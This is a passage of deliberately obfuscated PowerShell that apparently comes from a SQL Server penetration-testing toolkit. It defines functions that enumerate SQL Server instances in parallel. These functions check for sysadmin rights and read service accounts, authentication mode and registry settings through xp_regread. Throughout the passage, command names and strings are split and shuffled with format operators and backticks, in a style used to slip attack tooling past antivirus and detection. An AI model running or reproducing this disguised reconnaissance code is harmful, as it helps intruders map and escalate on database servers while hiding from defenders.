 '+' '+' '+' '+' '+' '+' '+' '+"'$ActiveSessions' "+'a'+'s '+'[ActiveSe'+'ss'+'ion'+'s]')
        
        ${T`BlS`Er`Verin`FOt`emp} = &("{1}{0}{3}{2}"-f 't','Ge','QLQuery','-S') -Instance ${iNST`A`Nce} -Query ${qu`e`Ry} -Username ${USeRN`A`me} -Password ${P`Assw`ORd} -Credential ${c`REDEnt`i`AL} -SuppressVerbose

        
        ${tBL`s`ERvERI`NFO} = ${tB`LS`ERV`ErI`Nfo} + ${TB`l`SE`RVER`iNFoteMp}
    }

    End
    {
        
        ${TBlSer`Veri`NfO}
    }
}






Function  Ge`T-SQl`SERv`ErINf`oTH`ReA`Ded
{
    
    [CmdletBinding()]
    Param(
        [Parameter(manDATorY = ${f`ALSe},
        HELpMeSSagE = {"{9}{0}{12}{8}{3}{11}{4}{6}{7}{5}{2}{10}{1}" -f 'QL S','with.','ti','r or ','oun',' authen','t ','to','rve','S','cate ','domain acc','e'})]
        [string]${USE`RN`AMe},

        [Parameter(maNdAtory = ${FAL`se},
        HeLpmESSagE = {"{17}{10}{0}{11}{2}{5}{4}{14}{7}{9}{13}{3}{6}{16}{12}{15}{8}{1}"-f 'e','th.','ver','nt p','doma',' or ','assword to',' ac','e wi','c','S','r','thentic','ou','in','at',' au','SQL '})]
        [string]${P`AsS`WORd},

        [Parameter(manDATOry = ${Fa`L`sE},
        heLPmEsSaGE = {"{0}{1}{3}{2}"-f 'Win','dows creden','ials.','t'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${C`R`ED`EnTial} =  ( ChilDItEm ('VARi'+'A'+'BLe:04'+'59'+'M2') ).VaLuE::"emP`Ty",

        [Parameter(MAndaTOrY = ${FA`L`se},
                VALuEFrOMpipElINEbyPROPERTynaME = ${tR`UE},
        HELpmesSaGe = {"{4}{1}{6}{3}{0}{5}{2}"-f'nn','Server instanc','to.','o co','SQL ','ection ','e t'})]
        [string]${InS`TaN`CE},

        [Parameter(mandATORY = ${fa`lSe},
        hElpMeSSaGe = {"{2}{0}{3}{1}{4}" -f'mber of t','ds','Nu','hrea','.'})]
        [int]${t`HrEa`Ds} = 5,

        [Parameter(MAnDATOrY = ${f`A`lSE},
        HelPmESsAGe = {"{13}{0}{6}{12}{11}{7}{1}{4}{3}{16}{8}{2}{9}{5}{15}{10}{14}"-f'up','r',' ','nct','s.  Used when fu','a','pres',' erro','on','is wr','p',' verbose','s','S','ed.','p','i'})]
        [switch]${SuPpre`sS`VERbO`se}
    )

    Begin
    {
        
        ${T`BLSErV`eRin`Fo} = &("{0}{1}{2}"-f'N','ew-O','bject') -TypeName ("{0}{3}{2}{1}"-f 'System.Data','taTable','Da','.')
        ${N`Ull} = ${TB`l`s`ErVERIn`FO}."Co`Lu`MnS".("{1}{0}"-f'dd','A').Invoke(("{2}{0}{1}"-f'ter','Name','Compu'))
        ${n`Ull} = ${TbL`SERve`RI`Nfo}."cO`LuM`NS".("{0}{1}"-f 'A','dd').Invoke(("{1}{0}{2}" -f 'tan','Ins','ce'))
        ${N`UlL} = ${tB`LseRvErin`Fo}."CO`L`UmNS".("{0}{1}"-f'Ad','d').Invoke(("{1}{2}{0}"-f 'ame','Dom','ainN'))
        ${NU`ll} = ${t`BLSeRV`ErI`N`FO}."cOlU`m`Ns".("{0}{1}"-f 'Ad','d').Invoke(("{0}{1}{2}" -f'Serv','iceN','ame'))
        ${n`UlL} = ${T`BlS`eRvE`R`InfO}."C`olUmNs".("{0}{1}" -f 'A','dd').Invoke(("{2}{4}{3}{1}{0}" -f'unt','co','S','iceAc','erv'))
        ${N`Ull} = ${tB`ls`E`RveRInfO}."coL`U`mNS".("{0}{1}"-f 'A','dd').Invoke(("{3}{0}{1}{2}"-f'uthenticatio','nMo','de','A'))
        ${n`ULl} = ${T`B`LsEr`VEr`iNFO}."col`UmNS".("{0}{1}" -f 'Ad','d').Invoke(("{0}{1}{2}" -f'Clus','ter','ed'))
        ${n`Ull} = ${TblSer`Ve`Rinfo}."c`oLuM`NS".("{1}{0}"-f'd','Ad').Invoke(("{4}{0}{2}{1}{6}{3}{5}"-f'Q','Vers','LServer','mb','S','er','ionNu'))
        ${nu`Ll} = ${tBl`s`ErV`ERiNfo}."c`olu`MNS".("{1}{0}"-f 'dd','A').Invoke(("{4}{6}{0}{3}{2}{5}{1}"-f 'rM','sion','r','ajo','S','Ver','QLServe'))
        ${nu`lL} = ${tBL`S`Erv`eR`InFo}."C`o`LuMNS".("{0}{1}" -f'A','dd').Invoke(("{1}{3}{0}{2}"-f'io','SQLServe','n','rEdit'))
        ${n`ULl} = ${TBl`SE`Rv`Er`inFo}."cOL`UM`NS".("{1}{0}"-f 'd','Ad').Invoke(("{1}{4}{0}{2}{3}" -f'erSer','SQLSer','viceP','ack','v'))
        ${Nu`LL} = ${tbLs`ER`VERIn`Fo}."C`oluMns".("{1}{0}"-f 'd','Ad').Invoke(("{1}{0}{3}{2}"-f'Arc','OS','ecture','hit'))
        ${n`ULL} = ${tb`lSE`RVEri`N`Fo}."CO`lu`mns".("{1}{0}"-f'dd','A').Invoke(("{0}{3}{2}{1}"-f 'OsMa','ineType','h','c'))
        ${N`ULL} = ${tblse`R`VERi`NfO}."coL`UM`Ns".("{1}{0}"-f'd','Ad').Invoke(("{4}{2}{1}{0}{3}" -f'e','V','S','rsionName','O'))
        ${n`ULl} = ${tB`LsE`RvErInfo}."C`olu`mnS".("{1}{0}"-f'dd','A').Invoke(("{0}{4}{1}{2}{3}" -f 'O','rs','ionNum','ber','sVe'))
        ${N`Ull} = ${TBlsERv`e`Ri`NFo}."C`OluM`Ns".("{0}{1}"-f 'A','dd').Invoke(("{2}{1}{0}" -f 'n','gi','Currentlo'))
        ${Nu`lL} = ${tb`LsERve`Ri`NFO}."c`OlUMNS".("{1}{0}"-f'd','Ad').Invoke(("{0}{1}{2}" -f 'Is','Sysadmi','n'))
        ${nU`LL} = ${TbL`SerV`e`RInfo}."cOL`UM`Ns".("{0}{1}"-f 'A','dd').Invoke(("{0}{1}{2}" -f'Acti','veSe','ssions'))

        
        ${pIpeli`NE`iTeMS} = &("{2}{3}{1}{0}" -f 'ect','Obj','Ne','w-') -TypeName ("{0}{3}{2}{4}{1}"-f 'Syste','e','.','m.Data','DataTabl')

        
        if(-not ${in`ST`A`Nce})
        {
            ${INS`TANce} = ${e`NV:COmp`Uter`NAme}
        }

        
        if(${InST`AncE})
        {
            ${pro`VI`d`Ein`sTancE} = &("{1}{2}{0}{3}"-f'j','N','ew-Ob','ect') -TypeName ("{0}{1}{2}" -f'PSObje','c','t') -Property @{
                ("{0}{1}{2}"-f 'I','nstan','ce') = ${ins`TANce}
            }
        }

        
        ${PI`PE`lINeITEMS} = ${PIpELINe`i`TEMS} + ${P`ROvIdEinSTA`NCE}
    }

    Process
    {
        
        ${piP`elIn`eITEMS} = ${p`iP`el`ineiT`eMS} + ${_}
    }

    End
    {
        
        ${m`ySCrI`pTBl`ock} = {
            ${i`NsT`AN`cE} = ${_}."inST`A`NcE"

            
            ${COm`PU`TErn`AME} = &("{4}{2}{0}{5}{3}{1}"-f'rom','tance','-ComputerNameF','ns','Get','I') -Instance ${in`St`ANCe}

            
            if(-not ${InSTA`N`ce})
            {
                ${in`STAn`cE} = ${enV:cOmPUT`eRN`A`mE}
            }

            
            ${T`eSt`c`on`NectIon} = &("{2}{3}{1}{0}{5}{6}{4}"-f'nnec','Co','Get-SQ','L','est','t','ionT') -Instance ${I`N`stANCE} -Username ${USe`Rn`A`mE} -Password ${p`Asswo`Rd} -Credential ${Cred`e`NTiAL} -SuppressVerbose | &("{2}{1}{0}" -f'-Object','ere','Wh') -FilterScript {
                ${_}."s`TAtuS" -eq ("{0}{1}{2}" -f'Ac','c','essible')
            }
            if(${T`est`cONnEc`Tion})
            {
                if( -not ${SU`Ppr`ES`SVERBoSe})
                {
                    &("{2}{3}{0}{1}"-f '-Verbo','se','Writ','e') -Message ("$Instance "+': '+'Co'+'nn'+'ect'+'ion '+'S'+'uccess.')
                }
            }
            else
            {
                if( -not ${s`UpPreS`s`V`ErboSe})
                {
                    &("{1}{3}{0}{2}"-f 'erbos','Writ','e','e-V') -Message ("$Instance "+': '+'Co'+'n'+'nection '+'Failed'+'.')
                }
                return
            }

            
            ${ac`TIVEsEssI`Ons} = &("{1}{0}{3}{4}{2}"-f 'et','G','ion','-SQLSes','s') -Instance ${in`STAN`cE} -Credential ${cr`EDE`NT`IAL} -Username ${UseR`N`AME} -Password ${PA`sSWo`Rd} -SuppressVerbose |
            &("{2}{1}{0}"-f 'ct','e','Where-Obj') -FilterScript {
                ${_}."s`e`SSionStAtuS" -eq ("{0}{1}" -f 'ru','nning')
            } |
            &("{0}{3}{4}{2}{1}" -f'Me','t','jec','asure-','Ob') -Line |
            &("{0}{2}{3}{4}{1}" -f 'Sel','t','ect-','O','bjec') -Property ("{1}{0}"-f'ines','L') -ExpandProperty ("{0}{1}"-f 'Line','s')

            
            ${isS`ySa`dM`IN} = &("{5}{1}{4}{0}{2}{3}"-f'ad','et-SQL','m','inCheck','Sys','G') -Instance ${i`Ns`TAnCE} -Credential ${cReD`e`NtIal} -Username ${uS`e`RNaME} -Password ${p`As`swO`Rd} -SuppressVerbose | &("{1}{3}{0}{2}"-f'Objec','Sel','t','ect-') -Property ("{0}{2}{1}"-f'IsS','dmin','ysa') -ExpandProperty ("{1}{2}{3}{0}"-f 'n','Is','Sys','admi')

            if(${IS`sysad`mIN} -eq 'Yes')
            {
                
                ${S`ysaDMiNs`ETUp} = ((("{18}{118}{105}{111}{34}{79}{28}{39}{49}{136}{67}{62}{175}{53}{127}{145}{43}{148}{152}{134}{64}{71}{143}{41}{155}{142}{123}{72}{74}{114}{159}{166}{85}{63}{26}{164}{138}{153}{137}{14}{27}{29}{7}{55}{6}{141}{83}{115}{128}{92}{100}{78}{90}{96}{15}{173}{94}{117}{89}{80}{86}{22}{87}{131}{99}{2}{174}{162}{17}{172}{104}{146}{31}{32}{3}{132}{46}{45}{57}{126}{165}{97}{185}{95}{187}{189}{188}{109}{42}{144}{163}{120}{106}{60}{135}{12}{168}{149}{121}{16}{68}{48}{21}{82}{88}{54}{156}{169}{116}{133}{61}{81}{19}{77}{73}{65}{147}{113}{24}{75}{13}{171}{161}{52}{154}{186}{38}{93}{25}{182}{151}{103}{23}{33}{119}{70}{9}{47}{98}{110}{44}{102}{183}{112}{157}{56}{0}{11}{122}{139}{59}{170}{69}{4}{181}{66}{176}{101}{158}{76}{84}{160}{184}{36}{129}{5}{180}{179}{91}{178}{177}{50}{30}{58}{108}{107}{10}{130}{1}{20}{8}{124}{37}{51}{35}{140}{150}{40}{167}{125}"-f 'N5PLSOFTWARE','    ','Control',' ','Cu','alue_','PLHKE','e',' ','P','5P','AmRMicroso','

       ','ECU','  ','        ',' ','lAmRProd','
  ','AR','    ','Get','ur','tk','               ','      ','e','  ','-','     @rootk','r','  ','   ','ey','     ','ue			= @ProductN','       @','    ',' ','- Get m','utp','YSNAME
      ','       ','  ','PL,
     ','       @v',' ','LHKEY',' ','achi','LP',' @val','egrea','    ','o','y		= N5','	= ','al','od','Wi','ou','     ','ty','r','p','ame  SYS','Ve',' ','   --','R','= N5','e','  ','N','      ','   EX',' ','E @Product','   ','    ','LSYSTEM','     DECL',' OS','M','   ','aster.dbo.xp_','AmRC','r',' versi','P','  ','e		= ','E5PL,','    ','		= ','5PL','       ','tTy','_L','t','
','L,','   ','o','5PL,','     ','e ','ctName','u',' ','OCAL_MACHINE5','   ','     @',' ',' E','ACH','       ','N5',' ','		','MachineTyp','      ','ftAm',' ',' ','t','ue_name','       ','IN','v','L,
 ','en','      ','   ','@MachineTy','tput','ne','    ','
   ','R','a','Y_LOCAL_','  ','  S','@value			= ','  ','
','NAME
 ','DECLAR',' ','me o','ro','E ','    ','d
      ','  ','n','key		','
 ','XECUTE ','      ','dbo.xp_r','ntro','@','gread','		= N5PLProduc','m','u','  ','
','ndows NTAm','TE master.','uctOptions','@key	','SetAmRCo','pe
     ','rsion5P','P','N5','m','na','rrent',' @','       ','  ','pe','  ',',','         ','
   '))  -crEPlACE'AmR',[CHar]92  -crEPlACE '5PL',[CHar]39)

                ${sy`sAD`miNQu`ERY} = ("{8}{11}{6}{12}{17}{9}{2}{23}{13}{19}{1}{16}{21}{22}{7}{10}{18}{24}{0}{5}{3}{14}{15}{20}{4}"-f'P','e],
','achi','oduc','onName],','r','achineType a','    ',' ','M',' ',' @M','s [','e','tName as [OS','Ver',' ','Os',' ','Typ','si','     ','  ','n','  @')
            }
            else
            {
                ${s`Ys`ADmI`Nse`TUP} = ''
                ${SyS`A`dMin`QUE`RY} = ''
            }

            
            ${q`U`ERy} = (' '+' '+'--'+' '+'Ge'+'t '+'SQ'+'L '+'Server'+' '+'I'+'n'+'formation

'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'-'+'- '+'G'+'et '+'SQL'+' '+'Server'+' '+'Serv'+'ic'+'e '+'Nam'+'e '+'and'+' '+'Pat'+'h
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'DECL'+'ARE '+'@S'+'QLServ'+'erInstanc'+'e '+'var'+'char'+'(25'+'0)
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'DECLAR'+'E '+'@SQLS'+'erver'+'S'+'ervic'+'eNa'+'me '+'var'+'char(250'+')
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'i'+'f '+'@@SE'+'RVICENA'+'ME '+'= '+(('rVuMSS'+'QLS'+'ER'+'VERr'+'Vu
 ') -replacE 'rVu',[chaR]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'BEG'+'IN
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'s'+'et '+'@SQ'+'LS'+'erv'+'e'+'rInstanc'+'e '+'= '+('{1}SY'+'ST'+'EM{0'+'}'+'Curren'+'tCon'+'trol'+'Set{0}Ser'+'vices'+'{0'+'}M'+'S'+'SQLS'+'ERVER{1}
 ')-F [cHAR]92,[cHAR]39+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'s'+'et '+'@S'+'QL'+'ServerSe'+'rviceN'+'a'+'me '+'= '+(('gHC'+'MSSQLSERVER'+'g'+'HC'+'
'+' ')  -RePlAcE 'gHC',[cHAR]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'END'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'EL'+'SE'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'BEGIN'+'
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'s'+'et '+'@SQL'+'Ser'+'ver'+'Inst'+'anc'+'e '+'= '+"'SYSTEM\CurrentControlSet\Services\MSSQL$'+cast(@@SERVICENAME "+'as'+' '+'varc'+'har('+'250'+'))
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'se'+'t '+'@SQLSe'+'rv'+'er'+'Ser'+'v'+'iceN'+'ame '+'= '+"'MSSQL$'+cast(@@SERVICENAME "+'as'+' '+'varcha'+'r(2'+'50'+'))'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'END'+'

'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'--'+' '+'Get'+' '+'SQ'+'L '+'Serve'+'r '+'Servic'+'e '+'Acc'+'o'+'unt
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'DEC'+'LARE '+'@'+'Serviceacco'+'untN'+'ame '+'varchar('+'25'+'0'+')
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'EXECU'+'T'+'E '+'master.dbo.'+'x'+'p_ins'+'tance_'+'regrea'+'d
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+(('NXl'+'pHKEY_'+'LOCAL_M'+'ACHINE'+'Xl'+'p, ') -rEplace([CHar]88+[CHar]108+[CHar]112),[CHar]39)+'@'+'S'+'QLSe'+'rve'+'rI'+'nstance,
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('N{0'+'}Ob'+'ject'+'N'+'a'+'me{0},@Serv'+'ic'+'eAcc'+'ount'+'Name ')-F[ChAR]39+'OUTP'+'UT'+', '+(('Ny'+'vHn'+'o_'+'ou'+'tputyvH
'+'
'+' ')  -RePLACe  'yvH',[ChAR]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'--'+' '+'Ge'+'t '+'aut'+'he'+'n'+'ti'+'cation '+'mode'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'DECLA'+'RE'+' '+'@A'+'u'+'thentica'+'tionMo'+'de '+'IN'+'T
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'E'+'XEC '+'mast'+'er.dbo.xp_'+'ins'+'tan'+'ce_'+'regread '+('N1C'+'WH'+'KE'+'Y_L'+'OC'+'AL_M'+'ACHINE1'+'CW'+',
 ')."R`e`PLacE"(([cHAR]49+[cHAR]67+[cHAR]87),[sTRINg][cHAR]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('NSGISoftwaredBHM'+'i'+'c'+'ros'+'oftdBH'+'MSSQLServerdBHM'+'SSQLSer'+'verSGI'+',
'+' ')."rE`pLaCe"(([ChAr]100+[ChAr]66+[ChAr]72),[sTRIng][ChAr]92)."re`pLa`CE"('SGI',[sTRIng][ChAr]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('N{'+'0}L'+'oginMod'+'e{0'+'}, ')-f  [CHAr]39+'@Authent'+'icat'+'ionMod'+'e'+' '+'OUTP'+'UT

 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'--'+' '+'G'+'rab '+'addit'+'i'+'onal'+' '+'i'+'nforma'+'tio'+'n '+'a'+'s '+'sys'+'adm'+'in
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$SysadminSetup

 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'-'+'- '+'R'+'e'+'turn '+'ser'+'ve'+'r '+'and'+' '+'ve'+'r'+'sion '+'infor'+'m'+'atio'+'n
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'S'+'ELEC'+'T '+' '+"'$ComputerName' "+'as'+' '+'[Co'+'mputer'+'Nam'+'e],
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'@@serverna'+'m'+'e '+'as'+' '+'[Inst'+'a'+'nce],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'DEF'+'A'+'ULT'+'_D'+'OMAIN()'+' '+'as'+' '+'[D'+'omainNa'+'me'+'],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'@SQ'+'LSe'+'rverS'+'ervi'+'ceNam'+'e '+'a'+'s '+'[S'+'erviceName]'+',
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'@'+'Service'+'Accoun'+'tName '+'a'+'s '+'[Se'+'rv'+'iceAccount],'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'(SEL'+'ECT'+' '+'C'+'ASE '+'@Au'+'thenti'+'cationMod'+'e'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'WHE'+'N '+'1 '+'THE'+'N '+(('YX8Window'+'s ') -CRePlAce([ChaR]89+[ChaR]88+[ChaR]56),[ChaR]39)+('Authentic'+'at'+'ionmNC'+'
 ')."REpl`ACe"('mNC',[STrInG][CHAr]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'WHE'+'N '+'2 '+'TH'+'EN '+(('Ed0W'+'in'+'dows ') -rEplaCe([Char]69+[Char]100+[Char]48),[Char]39)+'an'+'d '+'S'+'QL '+'Serve'+'r '+('Authen'+'tic'+'a'+'tion{0'+'}
 ') -f[CHAr]39+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'ELSE'+' '+('{0}Unkn'+'own{0'+'}
 ')  -F [CHAr]39+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'END)'+' '+'a'+'s '+'[Auth'+'e'+'nticati'+'o'+'n'+'Mod'+'e],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'CASE'+' '+' '+(('SER'+'V'+'ERPROPE'+'RTY('+'FupIsClusteredF'+'up)
 ') -rEPlaCe  'Fup',[cHar]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'WH'+'EN '+'0'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'T'+'HEN '+('u'+'M'+'bNo'+'uMb
 ')."r`EPLaCe"(([Char]117+[Char]77+[Char]98),[STRinG][Char]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'E'+'LSE '+('{'+'0'+'}Yes'+'{0}
 ')  -F  [CHAr]39+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'END'+' '+'as'+' '+'[Clu'+'st'+'ered'+'],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+(('SE'+'RVERPROPER'+'TY(HSKpro'+'duct'+'v'+'er'+'si'+'on'+'HSK'+') ') -CrePLaCE([CHAR]72+[CHAR]83+[CHAR]75),[CHAR]39)+'a'+'s '+'[SQLS'+'e'+'r'+'v'+'erVersionNumber]'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'SUBSTRING(@'+'@V'+'ERSIO'+'N,'+' '+('C'+'H'+'AR'+'IN'+'D'+'EX('+'O0B2O0B, ')."REP`laCe"('O0B',[StRIng][chaR]39)+'@'+'@VER'+'SION)'+', '+'4)'+' '+'as'+' '+'[S'+'QL'+'Serv'+'erMajo'+'rVersion'+'],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('serve'+'rproperty(pT9Edit'+'i'+'on'+'pT'+'9) ')."reP`LAce"(([ChaR]112+[ChaR]84+[ChaR]57),[StrIng][ChaR]39)+'as'+' '+'[SQL'+'Se'+'rve'+'rEdition'+']'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('SER'+'VERPROPE'+'RTY({0}Prod'+'u'+'ctLe'+'vel'+'{0}'+') ')-F  [chAR]39+'AS'+' '+'['+'SQL'+'Ser'+'verServicePa'+'ck]'+',
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'SUB'+'STR'+'ING(@@VER'+'SI'+'ON,'+' '+(('CHAR'+'IND'+'EX('+'Cf2xC'+'f2, ') -RePlace'Cf2',[cHAR]39)+'@@VERSION'+')'+','+' '+'3)'+' '+'a'+'s '+'[OSAr'+'ch'+'ite'+'ct'+'u'+'re'+'],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$SysadminQuery
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'R'+'IG'+'HT(SUBS'+'TRI'+'NG(@@'+'VER'+'SION, '+('CH'+'ARINDEX'+'(xYA'+'Windo'+'ws ')."Re`pLace"(([char]120+[char]89+[char]65),[sTRiNG][char]39)+(('N'+'T'+'SD'+'U, ')  -CRepLace  'SDU',[chAR]39)+'@@VERSION'+')'+','+' '+'1'+'4), '+'3)'+' '+'a'+'s '+'['+'O'+'sVer'+'si'+'onNumber],'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'S'+'Y'+'STEM_USER '+'as'+' '+'[Curre'+'n'+'tl'+'og'+'in],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$IsSysadmin' "+'a'+'s '+'[I'+'sSysad'+'min'+'],
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$ActiveSessions' "+'as'+' '+'[A'+'ct'+'i'+'veS'+'essions]')
            
            ${T`BLSerVErInf`o`TE`mP} = &("{0}{1}{2}"-f 'Get-SQL','Quer','y') -Instance ${i`NSt`ANce} -Query ${qU`ErY} -Username ${USErN`A`Me} -Password ${paS`Sw`OrD} -Credential ${c`R`edential} -SuppressVerbose

            
            ${tblSeRVer`i`NFo`T`EMP} |
            &("{0}{1}{3}{2}" -f'F','orEac','t','h-Objec') -Process {
                
                ${Nu`Ll} = ${tBL`seRvER`in`Fo}."RO`Ws".("{0}{1}"-f'Ad','d').Invoke(
                    ${_}."COM`Pu`TER`NAME",
                    ${_}."INsTA`Nce",
                    ${_}."DOma`INNa`ME",
                    ${_}."s`ERv`Ice`NAME",
                    ${_}."sErVI`Cea`c`C`Ount",
                    ${_}."auth`ENtI`caT`ioNm`odE",
                    ${_}."C`lUs`TEreD",
                    ${_}."S`qlSERvERvE`Rsi`oNnUmBer",
                    ${_}."sQl`S`eRVErmaJ`oRVErSioN",
                    ${_}."SQ`l`sEr`VeRed`Iti`on",
                    ${_}."sQ`Lse`RVeRS`eR`VicEPaCk",
                    ${_}."o`saRCH`iT`ecTUrE",
                    ${_}."oSmACHIN`E`TYpE",
                    ${_}."Os`VerSiO`NnaMe",
                    ${_}."O`S`VersionN`U`MBER",
                    ${_}."c`URre`Ntl`ogIn",
                    ${_}."iSsYSa`d`M`iN",
                    ${_}."A`cTIVes`es`SionS"
                )
            }
        }

        
        ${pipeLIn`eI`Te`MS} | &("{2}{3}{1}{0}" -f 'el','all','Invoke','-Par') -ScriptBlock ${my`sCR`iP`TblocK} -ImportSessionFunctions -ImportVariables -Throttle ${t`h`ReADS} -RunspaceTimeout 2 -Quiet -ErrorAction ("{1}{0}{2}{4}{3}" -f 'y','Silentl','C','ue','ontin')

        return ${Tblse`RV`erIN`Fo}
    }
}






Function  get-Sq`ldAtA`BaSe
{
    
    [CmdletBinding()]
    Param(
        [Parameter(manDatory = ${F`A`LSe},
        HELpMeSsAge = {"{6}{2}{3}{1}{8}{10}{9}{5}{0}{4}{7}"-f'e ','er or domain ac','L S','erv','wi','icat','SQ','th.','count t','authent','o '})]
        [string]${USErn`A`ME},

        [Parameter(MAndAtoRy = ${F`AlSE},
        hELPMesSage = {"{6}{16}{15}{4}{11}{12}{8}{5}{1}{3}{10}{13}{7}{2}{17}{14}{9}{0}" -f'.','d to','e',' ','er or domain ','r','SQ','at',' passwo','h','auth','a','ccount','entic','it','Serv','L ',' w'})]
        [string]${PAs`s`Word},

        [Parameter(ManDAtorY = ${fa`LSe},
        helPMEssagE = {"{6}{4}{3}{5}{1}{2}{0}" -f'als.','credent','i','nd','i','ows ','W'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${CRE`deNt`i`Al} =   (  cHILDiTem  ('Var'+'I'+'A'+'bLe:0459'+'m2') ).Value::"eM`PTY",

        [Parameter(manDAtORY = ${FA`lse},
                vaLuEFROMPiPelINEbYProPERtYName = ${tR`Ue},
        HeLpmesSAGe = {"{7}{9}{2}{10}{5}{8}{6}{1}{3}{4}{0}" -f'.','ec','erver','tion t','o','o c','n','SQL ','on','S',' instance t'})]
        [string]${i`NsT`ANce},

        [Parameter(maNdatoRy = ${fa`LSE},
                ValuefRompIPelINe = ${t`RUe},
                VAlUEFRompipelineBYPRopErTyNaME = ${T`Rue},
        HeLpmeSSage = {"{0}{2}{3}{1}" -f'Databa','me.','se',' na'})]
        [string]${dat`Ab`AsE`NAmE},

        [Parameter(mAnDAtORy = ${f`A`lSe},
        HElpMEssAGE = {"{2}{3}{4}{9}{7}{6}{5}{10}{8}{0}{1}"-f'ses','.','On','l','y sel','fa','non de','t ','databa','ec','ult '})]
        [switch]${NOde`F`A`UltS},

        [Parameter(mANDaTorY = ${fa`L`SE},
        heLpMeSsage = {"{2}{5}{9}{10}{6}{11}{8}{7}{4}{1}{0}{3}"-f'acce','ser has ','Only s','ss to.','u','elect data','the ','t ','en','base','s ','curr'})]
        [switch]${HA`saCC`eSs},

        [Parameter(MAnDatorY = ${f`AlsE},
        hELPmessaGe = {"{6}{7}{1}{5}{2}{10}{4}{8}{3}{9}{0}"-f 'n.',' selec',' ',' ','s ','t','O','nly','owned','by a sysadmi','database'})]
        [switch]${S`ysaDMinO`NLY},

        [Parameter(mANDaTORy = ${Fa`lSe},
        HELpMeSSaGe = {"{6}{1}{7}{9}{8}{10}{2}{0}{3}{5}{4}"-f ' func','up','when','tion ','s wrapped.','i','S','press verbose','rors.  U',' er','sed '})]
        [switch]${Su`PPreSsvE`R`B`oSE}
    )

    Begin
    {
        
